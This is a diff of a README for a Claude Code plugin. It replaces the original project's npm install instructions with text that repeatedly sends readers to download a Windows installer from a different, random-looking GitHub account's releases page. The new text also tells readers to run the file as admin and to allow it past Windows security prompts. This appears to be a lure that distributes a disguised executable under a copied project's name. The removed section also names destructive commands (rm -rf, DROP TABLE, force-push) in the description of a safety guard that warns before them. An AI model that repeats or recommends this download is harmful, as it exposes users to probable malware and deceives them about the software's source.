@@ -1,343 +1,186 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Claude_Code-Plugin-blueviolet?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyem0wIDE4Yy00LjQyIDAtOC0zLjU4LTgtOHMzLjU4LTggOC04IDggMy41OCA4IDgtMy41OCA4LTggOHoiLz48L3N2Zz4="/>
-  <img src="https://img.shields.io/badge/MCP_Servers-5-green?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/Skills-21-orange?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/Tools-31-blue?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge"/>
-</p>
+# 🤖 Oh-my-ClaudeClaw - Automate Claude Work With Ease
 
-# OpenClaw-CC
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/detachable-fossafossa258/Oh-my-ClaudeClaw/releases)
 
-**Autonomous AI Assistant Plugin for Claude Code**
+## 📥 Download
 
-> Turn Claude Code into a self-improving autonomous assistant with persistent memory, systematic debugging, automated releases, QA cycles, and multi-agent orchestration.
+Visit this page to download for Windows: https://github.com/detachable-fossafossa258/Oh-my-ClaudeClaw/releases
 
-**[Quick Start](#-quick-start)** · **[Features](#-features)** · **[Skills](#-skills-21)** · **[Architecture](#-architecture)** · **[Plugin Install](#-plugin-installation)** · **[Contributing](CONTRIBUTING.md)**
+Open the latest release and get the Windows build that matches your device. If you see more than one file, choose the Windows installer or the Windows app file listed in the release notes.
 
----
+## 🖥️ What this app does
 
-## Why OpenClaw-CC?
+Oh-my-ClaudeClaw is a Claude Code plugin that helps you run AI work with less manual setup. It brings together memory, task handling, and agent coordination in one place.
 
-| Without | With OpenClaw-CC |
-|---------|-----------------|
-| Every session starts from zero | **3-tier persistent memory** across all sessions |
-| Manual debugging guesswork | **6-step systematic debugging** with Iron Law |
-| Copy-paste release workflow | **8.5-step automated ship** (test→review→PR) |
-| No safety nets | **Hook-based guardrails** (freeze, careful, guard) |
-| Single-agent limitations | **19 OMC agents** + 4 project agents orchestrated |
-| No external notifications | **Discord/Telegram** real-time alerts |
-| Stale API knowledge | **4,400+ curated docs** via Context Hub |
+It is built for everyday use with features that can help with:
 
----
+- Recalling past work
+- Keeping long-term context
+- Handling repeat tasks
+- Connecting chat tools like Discord and Telegram
+- Coordinating several AI workers at once
+- Using knowledge from saved notes and links
 
-## Quick Start
+## ✨ Main features
 
-### Option A: Plugin Installation (Recommended)
+- 5 MCP servers for tool access and task support
+- 21 skills for common work patterns
+- 3-tier persistent memory for short and long context
+- Knowledge graph support for linked facts and topics
+- Multi-agent orchestration for splitting work across agents
+- Discord integration for remote control and updates
+- Telegram integration for chat-based access
+- 24/7 working setup for always-on tasks
 
-```bash
-# 1. Add marketplace
-/plugin marketplace add https://github.com/Kit4Some/Oh-my-ClaudeClaw
+## 🪟 Windows system needs
 
-# 2. Install plugin
-/plugin install openclaw-cc@openclaw-cc
+Use a Windows PC with:
 
-# 3. Install MCP dependencies
-cd ~/.claude/plugins/cache/openclaw-cc/openclaw-cc/latest
-cd mcp-servers/memory-manager && npm install && cd ../..
-cd mcp-servers/knowledge-engine && npm install && cd ../..
-cd mcp-servers/messenger-bot && npm install && cd ../..
-cd mcp-servers/task-scheduler && npm install && cd ../..
-```
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 2 GB free disk space
+- A stable internet connection
+- Admin access for setup if Windows asks for it
 
-### Option B: Manual Installation
+For smoother use, 16 GB RAM works better when you run several agents or keep more memory active.
 
-```bash
-# 1. Clone
-git clone https://github.com/Kit4Some/Oh-my-ClaudeClaw.git
-cd Oh-my-ClaudeClaw
+## 🚀 Getting started
 
-# 2. Install dependencies
-for dir in mcp-servers/*/; do (cd "$dir" && npm install); done
+1. Open the download page: https://github.com/detachable-fossafossa258/Oh-my-ClaudeClaw/releases
+2. Download the Windows file from the latest release
+3. If the file is a ZIP, right-click it and choose Extract All
+4. Open the extracted folder
+5. Run the Windows app or installer file
+6. Follow the on-screen setup steps
+7. Start Claude Code and connect Oh-my-ClaudeClaw when the app asks
 
-# 3. (Optional) Install Context Hub for API doc fetching
-npm install -g @aisuite/chub
-
-# 4. Generate skills from templates
-node scripts/gen-skill-docs.mjs
-
-# 5. Launch
-claude
-```
-
-### Environment Setup (Optional)
-
-For Discord/Telegram integration, create `.env`:
-
-```bash
-DISCORD_BOT_TOKEN=your_token
-DISCORD_CHANNEL_ID=your_channel
-DISCORD_WEBHOOK_URL=your_webhook
-TELEGRAM_BOT_TOKEN=your_token
-TELEGRAM_CHAT_ID=your_chat_id
-```
-
-### Prerequisites
-
-- [Claude Code](https://claude.ai/code) with active subscription
-- [oh-my-claudecode](https://github.com/Yeachan-Heo/oh-my-claudecode) plugin
-- Node.js >= 18
-
----
-
-## Features
-
-### 3-Tier Persistent Memory
-
-```
-Episodic (30d)  →  Working (30d)  →  Long-term (permanent)
-  daily-logs         tasks              knowledge
-  captures           sessions           projects
-                     inbox              people
-```
-
-- **FTS5 full-text search** with associative mode (5-signal ranking)
-- **Knowledge graph** with 6 relation types (related, derived, supersedes, blocks, contradicts, refines)
-- **Trigram similarity search** for deduplication (no external API)
-- **Automatic refinement pipeline**: nightly dedup, weekly decay, monthly summary
-
-### Multi-Agent Orchestration
-
-19 OMC agents + 4 project-local agents with intelligent routing:
-
-| Tier | Model | Agents |
-|------|-------|--------|
-| Quick | Haiku | explore, writer, comms-agent, session-manager |
-| Standard | Sonnet | executor, debugger, tracer, verifier, test-engineer, designer, scientist, memory-specialist, research-agent |
-| Complex | Opus | analyst, planner, architect, critic, code-reviewer, code-simplifier, product-manager |
-
-### Safety System (from gstack)
-
-| Skill | Protection |
-|-------|-----------|
-| `/freeze` | Blocks Edit/Write outside a chosen directory via PreToolUse hooks |
-| `/careful` | Warns before `rm -rf`, `DROP TABLE`, `force-push`, `reset --hard`, etc. |
-| `/guard` | Activates both freeze + careful simultaneously |
-
-### Skill Template System
-
-21 skills generated from `.tmpl` templates with 11 shared blocks — zero duplication:
-
-```bash
-node scripts/gen-skill-docs.mjs           # regenerate all
-node scripts/gen-skill-docs.mjs ship       # regenerate one
-node scripts/skill-check.mjs              # health dashboard
-```
-
----
-
-## Architecture
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│                       Claude Code                            │
-│                                                              │
-│  ┌──────────┐  ┌───────────┐  ┌───────────────────────────┐ │
-│  │ 21 Skills │  │ 4 Agents  │  │   oh-my-claudecode (OMC)  │ │
-│  │ template  │  │ memory    │  │   19 specialized agents   │ │
-│  │ generated │  │ comms     │  │   team orchestration      │ │
-│  │           │  │ research  │  │   LSP/AST/Python tools    │ │
-│  │           │  │ session   │  │   state management        │ │
-│  └─────┬─────┘  └─────┬─────┘  └────────────┬──────────────┘ │
-│        │               │                      │               │
-│  ┌─────▼───────────────▼──────────────────────▼─────────────┐ │
-│  │               5 MCP Servers (31 tools)                    │ │
-│  │                                                           │ │
-│  │  memory-manager (9)  ·  knowledge-engine (6)              │ │
-│  │  messenger-bot  (4)  ·  task-scheduler  (7)               │ │
-│  │  context-hub    (5)                                       │ │
-│  └─────────────────────────┬─────────────────────────────────┘ │
-│                            │                                   │
-│  ┌─────────────────────────▼─────────────────────────────────┐ │
-│  │              3-Tier Persistent Memory                      │ │
-│  │                                                           │ │
-│  │  Episodic (30d) ──→ Working (30d) ──→ Long-term (∞)      │ │
-│  │                                                           │ │
-│  │  SQLite FTS5 · Knowledge Graph · Trigram Similarity       │ │
-│  │  Associative Search (5 signals) · Auto-Refinement         │ │
-│  └───────────────────────────────────────────────────────────┘ │
-│                            │                                   │
-│  ┌─────────────────────────▼─────────────────────────────────┐ │
-│  │           External Integrations                            │ │
-│  │  Discord · Telegram · Context Hub (4,400+ API docs)       │ │
-│  └───────────────────────────────────────────────────────────┘ │
-└──────────────────────────────────────────────────────────────┘
-```
-
----
-
-## MCP Servers (5 servers, 31 tools)
-
-| Server | Tools | Key Capabilities |
-|--------|-------|-----------------|
-| **memory-manager** | 9 | `memory_store` `memory_search` `memory_get` `memory_update` `memory_delete` `memory_daily_log` `memory_search_date` `memory_list` `memory_stats` |
-| **knowledge-engine** | 6 | `memory_link` `memory_graph` `memory_similar` `memory_refine` `memory_archive` `memory_reindex_trigrams` |
-| **messenger-bot** | 4 | `messenger_send` `messenger_read` `messenger_poll` `messenger_status` |
-| **task-scheduler** | 7 | `task_create` `task_list` `task_update` `task_delete` `task_run_now` `task_history` `task_generate_crontab` |
-| **context-hub** | 5 | `chub_search` `chub_get` `chub_list` `chub_annotate` `chub_feedback` |
-
----
-
-## Skills (21)
-
-### Workflow Skills
-
-| Skill | What It Does |
-|-------|-------------|
-| `/ship` | **8.5-step release automation**: pre-flight → merge base → test → coverage audit → pre-landing review → version bump → changelog → bisectable commits → verification gate → push → PR → notify |
-| `/investigate` | **6-step systematic debugging**: gather evidence → reproduce → scope lock → pattern analysis → hypothesis testing (3-strike rule) → verified fix with regression test |
-| `/code-review` | **Multi-pass review**: scope drift detection → mechanical auto-fix (Pass 1) → security audit (Pass 2) → judgment items (Pass 3) → doc staleness check → WTF-likelihood gate |
-| `/qa` | **Test-Fix-Verify cycle**: baseline → triage (Quick/Standard/Exhaustive) → fix loop with atomic commits → regression tests → WTF-likelihood self-regulation (hard cap: 50 fixes) |
-| `/office-hours` | **Idea validation**: Startup mode (6 forcing questions) or Builder mode (generative brainstorming) → landscape search → premise challenge → forced alternatives → design document |
-| `/retro` | **Engineering retrospective**: git + memory data → metrics table → time distribution → session detection → commit analysis → hotspots → focus score → streak tracking → trend comparison |
-
-### Core Skills
-
-| Skill | What It Does |
-|-------|-------------|
-| `/task-analyzer` | Decompose complex tasks → route to appropriate agents → execute → report |
-| `/memory-ops` | Store, search, organize persistent memories with importance scoring |
-| `/research-collector` | Multi-angle web research → structured output → dedup → store |
-| `/daily-routine` | Morning briefing, task management, evening review, weekly retrospective |
-| `/doc-fetcher` | Fetch API docs from Context Hub (4,400+ libraries) with annotations and feedback |
-
-### Safety Skills
-
-| Skill | What It Does |
-|-------|-------------|
-| `/freeze` | Block Edit/Write outside a chosen directory (hook-based, session-scoped) |
-| `/careful` | Warn before destructive commands: `rm -rf`, `DROP TABLE`, `force-push`, `reset --hard` |
-| `/guard` | Activate freeze + careful simultaneously for maximum safety |
-| `/unfreeze` | Remove edit restrictions |
-
-### Advanced Skills
-
-| Skill | What It Does |
-|-------|-------------|
-| `/knowledge-refiner` | Detect duplicates, merge, archive stale, promote layers, reindex |
-| `/session-tracker` | Dual-write to OMC state + persistent memory for cross-session continuity |
-| `/web-researcher` | Multi-angle web search with evidence ranking and knowledge graph integration |
-| `/autonomous-ops` | 24/7 messenger-driven autonomous loop: poll → analyze → dispatch → persist → report |
-| `/knowledge-sync` | Bidirectional sync between OMC ephemeral state and persistent memory |
-| `/deep-research` | 3 parallel research agents → analyst synthesis → critic review → knowledge graph |
-
----
-
-## Builder Ethos
-
-Five principles embedded in every skill via `{{OCC_ETHOS}}` template block ([full document](docs/ETHOS.md)):
-
-| Principle | Core Idea |
-|-----------|-----------|
-| **Boil the Lake** | AI makes complete implementation near-free. Do the complete thing, every time. |
-| **Search Before Building** | Memory (L0) → Standard patterns (L1) → Current trends (L2) → First principles (L3) |
-| **Build for Yourself** | Specificity of a real problem beats generality of a hypothetical one |
-| **Memory is Cheap** | Always store, always search. Let the refinement pipeline handle cleanup. |
-| **Delegate or Die** | Right agent, right model. Never self-approve. Separate authoring from review. |
-
----
-
-## Project Structure
-
-```
-Oh-my-ClaudeClaw/
-├── .claude-plugin/
-│   ├── plugin.json            # Plugin manifest
-│   └── marketplace.json       # Marketplace catalog
-├── .claude/
-│   ├── agents/                # 4 project-local agents (OMC-quality prompts)
-│   └── settings.local.json    # 5 lifecycle hooks
-├── .mcp.json                  # 5 MCP server configurations
-├── CLAUDE.md                  # Project instructions (loaded by Claude Code)
-│
-├── skills/                    # 21 skills
-│   ├── {skill}/SKILL.md.tmpl  #   Template source (edit this)
-│   └── {skill}/SKILL.md       #   Auto-generated (don't edit)
-│
-├── mcp-servers/
-│   ├── memory-manager/        # 9 tools — SQLite FTS5 + associative search
-│   ├── knowledge-engine/      # 6 tools — graph, similarity, refinement
-│   ├── messenger-bot/         # 4 tools — Discord/Telegram
-│   └── task-scheduler/        # 7 tools — cron + claude CLI execution
-│
-├── scripts/
-│   ├── gen-skill-docs.mjs     # SKILL.md.tmpl → SKILL.md generator
-│   ├── skill-check.mjs        # Health dashboard
-│   ├── template-blocks/       # 11 shared blocks (preamble, memory, etc.)
-│   └── hooks/                 # 5 lifecycle hooks (.mjs)
-│
-├── memory-store/              # Persistent memory (gitignored data)
-├── docs/ETHOS.md              # Builder philosophy
-├── package.json               # Build scripts
-├── LICENSE                    # MIT
-└── CONTRIBUTING.md            # Contribution guidelines
-```
-
----
-
-## How It Works
-
-```
-User says: "debug this auth error"
-     │
-     ▼
-┌─ Keyword Detection ──────────────────────────┐
-│  Matches: "debug" → suggests /investigate     │
-└───────────────────────────┬───────────────────┘
-                            ▼
-┌─ /investigate Skill ──────────────────────────┐
-│  1. memory_search(tag: "bug") → past context  │
-│  2. OMC tracer agent → evidence gathering     │
-│  3. LSP tools → precise code navigation       │
-│  4. Reproduce → Scope lock → Pattern match    │
-│  5. 3-strike hypothesis testing               │
-│  6. OMC executor → implement fix              │
-│  7. OMC verifier → verify + regression test   │
-│  8. memory_store → persist for future         │
-│  9. messenger_send → notify completion        │
-└───────────────────────────────────────────────┘
-```
-
----
-
-## Translations
-
-| Language | Link |
-|----------|------|
-| English | [README.md](README.md) (this file) |
-| Korean (한국어) | [README.ko.md](README.ko.md) |
-| Chinese (中文) | [README.zh.md](README.zh.md) |
-| Japanese (日本語) | [README.ja.md](README.ja.md) |
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for:
-- Development setup and workflow
-- How to add new skills, MCP tools, or agents
-- Template system conventions
-- Pull request checklist
-
----
-
-## Credits
-
-Built on top of:
-- [Claude Code](https://claude.ai/code) by Anthropic
-- [oh-my-claudecode](https://github.com/Yeachan-Heo/oh-my-claudecode) by Yeachan Heo
-- [gstack](https://github.com/garrytan/gstack) patterns by Garry Tan
-- [Context Hub](https://github.com/andrewyng/context-hub) by Andrew Ng
-
-## License
-
-[MIT](LICENSE) © Evan Lee (Kit4Some)
+## 🔧 Setup on Windows
+
+After you start the app, you may see a first-run setup screen.
+
+Follow these steps:
+
+1. Choose your preferred language if the app asks
+2. Select your Claude Code connection
+3. Allow access to local files if you want memory and project support
+4. Add your Discord or Telegram details if you plan to use chat control
+5. Save your settings
+6. Restart the app if it asks
+
+If Windows shows a security prompt, choose the option that lets the app run. This is normal for a new app that you just downloaded.
+
+## 📂 How it works
+
+Oh-my-ClaudeClaw uses a few parts behind the scenes:
+
+- **MCP servers** handle tool access
+- **Skills** handle common tasks
+- **Memory** stores what the assistant learns over time
+- **Knowledge graph** links related facts together
+- **Multi-agent orchestration** splits large work into smaller steps
+- **Discord and Telegram integration** let you send tasks from chat
+
+You do not need to manage these parts by hand. The app handles the flow once you set it up.
+
+## 💬 Using Discord and Telegram
+
+If you connect Discord or Telegram, you can use the app from chat.
+
+Common uses include:
+
+- Sending a task to the assistant
+- Checking progress
+- Getting replies while you are away
+- Keeping an always-on work loop running
+
+To use these features, open the app settings and add the details for the service you want to use.
+
+## 🧠 Memory and knowledge graph
+
+The memory system helps the assistant keep useful context.
+
+It uses three levels:
+
+- Recent memory for active work
+- Project memory for current tasks
+- Long-term memory for facts that matter later
+
+The knowledge graph links related items so the app can find connections across notes, tasks, and past work. This helps the assistant stay consistent over time.
+
+## 🛠️ Common use cases
+
+You can use Oh-my-ClaudeClaw for:
+
+- Daily task help
+- Long-running AI work
+- Project notes and context
+- Chat-based control
+- Repeated workflow steps
+- Coordinating several AI agents
+- Saving useful details for later
+
+## 📁 Files you may see in a release
+
+A Windows release may include files like:
+
+- Installer file
+- Portable app file
+- ZIP archive
+- Release notes
+- Support files
+
+If there is more than one Windows file, choose the one marked for Windows. If you want the easiest setup, use the installer when it is available.
+
+## ⚙️ Basic use steps
+
+1. Start the app
+2. Connect Claude Code
+3. Turn on the features you want
+4. Add chat integration if needed
+5. Give the assistant a task
+6. Let it work in the background
+7. Check the output in the app or in chat
+
+## 🔍 Troubleshooting
+
+If the app does not start:
+
+- Check that the file finished downloading
+- Try running it again as admin
+- Move the app to a simple folder like `Downloads` or `Desktop`
+- Make sure Windows did not block the file
+- Restart your PC and try again
+
+If Claude Code does not connect:
+
+- Confirm Claude Code is installed
+- Check your account sign-in
+- Open the app settings and reconnect
+- Restart both apps
+
+If Discord or Telegram does not work:
+
+- Check your bot or chat settings
+- Make sure the token or key is correct
+- Save settings again
+- Restart the app
+
+## 📦 Recommended first run
+
+For the first setup, use this order:
+
+1. Install the app
+2. Open it once
+3. Connect Claude Code
+4. Test one simple task
+5. Add memory settings
+6. Turn on Discord or Telegram if needed
+7. Try a longer task after the first test works
+
+## 🔒 Privacy and local control
+
+The app can store memory and project data so it can work across sessions. Keep control of what you connect and what you save. If you do not want chat access, you can skip Discord and Telegram setup
+
+## 📌 Project topics
+
+ai-agent, ai-assistant, autonomous-agent, claude-code, claude-code-plugin, discord-bot, knowledge-graph, mcp-server, memory-system, multi-agent, orchestration, telegram-bot
